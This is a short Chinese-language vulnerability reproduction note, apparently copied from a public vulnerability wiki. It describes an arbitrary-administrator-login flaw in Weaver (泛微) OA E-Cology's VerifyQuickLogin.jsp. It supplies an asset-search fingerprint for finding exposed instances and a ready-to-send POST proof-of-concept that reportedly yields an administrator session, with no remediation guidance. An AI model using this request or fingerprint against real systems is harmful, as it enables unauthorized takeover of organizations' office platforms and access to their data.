---
title: "泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞"
date: 2026-10-17 09:12:27
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "漏洞复现"
---
## 漏洞描述

泛微OA E-Cology VerifyQuickLogin.jsp文件中存在任意管理员登录漏洞，攻击着通过发送特殊的请求包可以获取管理员Session

## 漏洞影响

```
泛微OA E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

产品主页

![image-20220824142008751](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202208241420826.png)

验证POC

```
POST /mobile/plugin/VerifyQuickLogin.jsp
  
identifier=1&language=1&ipaddress=x.x.x.x
```

![image-20220824142028221](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202208241420269.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-E-Cology-VerifyQuickLogin.jsp-%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md)
